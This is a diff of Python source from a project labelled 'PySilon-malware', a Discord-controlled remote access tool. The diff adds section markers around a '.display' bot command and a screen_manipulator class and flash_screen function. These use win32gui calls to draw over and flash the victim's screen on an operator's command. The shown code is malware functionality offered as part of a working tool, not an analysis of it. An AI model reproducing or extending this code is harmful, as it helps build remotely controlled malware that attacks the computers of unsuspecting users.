@@ -1,3 +1,4 @@
+#<imports>
 import win32print
 import win32gui
 import win32con
@@ -6,7 +7,9 @@ import random
 import math
 import json
 import time
+#</imports>
 
+#<command>
 @client.command(name='display')
 async def screen_manipulation(ctx, option=None):
     await ctx.message.delete()
@@ -51,7 +54,9 @@ async def screen_manipulation(ctx, option=None):
         embed = discord.Embed(title="📛 Error",description='```Syntax: .display <graphic / glitch> <other options>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await ctx.send(embed=embed)
+#</command>
 
+#<engine>
 class screen_manipulator:
     def __init__(self, saved_file):
         with open(saved_file, 'r', encoding='utf-8') as read_data:
@@ -96,6 +101,7 @@ class screen_manipulator:
                 win32gui.PatBlt(screen_dc, starting_pos[0] + pixel[0] * size, starting_pos[1] + pixel[1] * size, size, size, win32con.PATCOPY)
             win32gui.DeleteObject(brush)
             win32gui.ReleaseDC(0, screen_dc)
+
 def flash_screen(effect):
     hdc = win32gui.GetDC(0)
     x, y = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)
@@ -189,3 +195,4 @@ def flash_screen(effect):
     if effect != 'list':
         win32api.Sleep(10)
         win32gui.DeleteDC(hdc)
+#</engine>
